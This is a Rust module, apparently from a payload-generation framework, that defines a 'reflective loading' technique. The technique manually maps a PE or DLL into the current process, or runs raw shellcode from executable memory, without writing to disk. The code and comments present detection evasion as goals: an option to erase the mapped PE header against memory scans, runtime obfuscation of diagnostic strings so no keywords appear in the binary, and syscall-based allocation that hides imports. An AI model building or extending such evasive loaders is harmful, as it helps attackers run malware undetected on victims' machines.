//! Reflective loading.
//!
//! Maps a PE into the current process (manual mapping) and runs its entry
//! point, so the payload executes without an external target process and
//! without touching disk. For a `format: shellcode` payload there is no image
//! to map, so the raw bytes are copied into an executable allocation and run
//! instead. See `README.md` for the full write-up.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::plan::schema::PayloadFormat;

use super::{Capability, Category, Stability, TechniqueDef};

/// Parameters for reflective loading: which payload to load (the payload
/// format and export live in the payload's `build.payloads` entry).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// Name of the payload in `build.payloads` to load. Optional when the plan
    /// declares exactly one payload.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub payload: Option<String>,

    /// Zero the mapped image's PE header (`SizeOfHeaders` bytes at its base)
    /// after the loader's fixups and before any payload code runs, so a memory
    /// scan does not find an `MZ`/`PE` pair at the mapped base.
    ///
    /// Off by default: payload startup code that reads its own PE header (e.g.
    /// the MSVC CRT's `__scrt_get_show_window_mode`) can break. Only applies to
    /// `pe`/`dll` payloads; a `shellcode` payload has no mapped image.
    #[serde(default)]
    pub erase_header: bool,
}

/// Static metadata for reflective loading.
pub const DEF: TechniqueDef = TechniqueDef {
    name: "reflective_loading",
    attck: &["T1620"],
    // Measured widely (e2e marker + exit code on x64/x86). Not `Stable` because
    // a payload that raises a native exception cannot unwind on x64 — the mapped
    // image's unwind tables are not registered (README).
    stability: Stability::Experimental,
    requires: &[Capability::WindowsX64, Capability::WindowsX86],
    conflicts: &["process_hollowing"],
    category: Category::Execution,
    doc_path: "src/techniques/reflective_loading/README.md",
    stub_fragment: include_str!("stub_fragment.rs"),
    formats: &[
        super::PayloadFormat::Pe,
        super::PayloadFormat::Dll,
        super::PayloadFormat::Shellcode,
    ],
    requires_indirect_syscalls: false,
    params_example: "technique: reflective_loading\nparams:\n  erase_header: false\n",
    readme: include_str!("README.md"),
    // Allocation and page protection go through the syscall layer
    // (`nt_alloc_vm`/`nt_protect_vm`), so `mode: indirect` removes the
    // VirtualAlloc/VirtualProtect imports. `CreateThread` stays Win32
    // (`NtCreateThreadEx` takes eleven arguments — see the technique README).
    syscalls: &["NtAllocateVirtualMemory", "NtProtectVirtualMemory"],
    resolves_imports: true,
};

/// The shellcode format's fragment: the same technique, but a runner instead of
/// a PE mapper. Rendered when `build.payloads.<name>.format: shellcode`.
pub const SHELLCODE_FRAGMENT: &str = include_str!("stub_fragment_shellcode.rs");

/// Runtime diagnostics the PE mapper can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// The renderer replaces each placeholder with code that rebuilds the message at
/// runtime, so no diagnostic text — least of all the payload format or a
/// technique keyword — lands in the generated stub's `.rdata`. Messages that
/// interpolate a value keep a keyword-free `format!`/helper call at the site
/// (`format!` cannot take a runtime format string).
const MESSAGES: &[(&str, &str)] = &[
    ("$MSG_FILE_TOO_SMALL$", "file too small to be a valid PE"),
    ("$MSG_INVALID_DOS$", "invalid DOS signature (expected MZ)"),
    ("$MSG_INVALID_NT$", "invalid NT signature (expected PE)"),
    (
        "$MSG_UNSUPPORTED_ARCH$",
        "the payload's architecture does not match the stub's",
    ),
    ("$MSG_ALLOCATE_FAILED$", "failed to allocate image memory"),
    (
        "$MSG_SECTION_OUT_OF_BOUNDS$",
        "section is out of file bounds",
    ),
    (
        "$MSG_VIRTUAL_PROTECT_FAILED$",
        "could not change protection for a section",
    ),
    (
        "$MSG_EXPORT_NOT_FOUND$",
        "the payload does not export a requested symbol",
    ),
];

/// Runtime diagnostics the shellcode runner can emit, as `(placeholder,
/// plaintext)` pairs. Distinct tokens from [`MESSAGES`] so the two fragments
/// never substitute each other's placeholders.
const SHELLCODE_MESSAGES: &[(&str, &str)] = &[
    ("$MSG_SHELLCODE_EMPTY$", "the payload is empty"),
    (
        "$MSG_SHELLCODE_ALLOCATE_FAILED$",
        "could not allocate executable memory",
    ),
    (
        "$MSG_SHELLCODE_THREAD_FAILED$",
        "could not create the execution thread",
    ),
];

/// Replaces each `(placeholder, plaintext)` pair in `text` with code that
/// rebuilds the message at runtime under `strings`'s active strategy.
///
/// `var_prefix` names the stack-strategy temporary for each message (ignored by
/// the xor strategy); the two fragments pass distinct prefixes so nothing
/// collides if a stub ever contains both.
fn substitute(
    text: String,
    messages: &[(&str, &str)],
    strings: &StringsConfig,
    var_prefix: &str,
) -> String {
    let mut rendered = text;
    for (index, (placeholder, message)) in messages.iter().enumerate() {
        rendered = rendered.replace(
            placeholder,
            &strings
                .obfuscate(message)
                .render_stub_expr(&format!("{var_prefix}{index}")),
        );
    }
    rendered
}

impl Params {
    /// Renders the reflective-loading stub fragment.
    ///
    /// The only per-build value is [`Params::erase_header`] (a `true`/`false`
    /// constant in the fragment); `strings` feeds the obfuscated diagnostics.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        substitute(DEF.stub_fragment.to_string(), MESSAGES, strings, "pe_msg_").replace(
            "$ERASE_HEADER$",
            if self.erase_header { "true" } else { "false" },
        )
    }

    /// Renders the fragment that matches the payload's binary format.
    ///
    /// `pe` and `dll` share the PE mapper; a DLL may additionally name an
    /// export to call (`build.payloads.<name>.export`, obfuscated through `strings`). A
    /// `shellcode` payload gets the raw-code runner instead — it has no mapped
    /// image, so [`Params::erase_header`] does not apply to it.
    pub fn render_fragment_for(
        &self,
        strings: &StringsConfig,
        format: PayloadFormat,
        export: Option<&str>,
    ) -> String {
        if !format.is_pe_image() {
            return substitute(
                SHELLCODE_FRAGMENT.to_string(),
                SHELLCODE_MESSAGES,
                strings,
                "sc_msg_",
            );
        }

        let export_def = match export {
            Some(name) => format!(
                "Some({})",
                strings.obfuscate(name).render_stub_expr("dll_export")
            ),
            None => "None".to_string(),
        };
        self.render_fragment(strings)
            .replace("$DLL_EXPORT_DEF$", &export_def)
    }
}

#[cfg(test)]
mod tests;
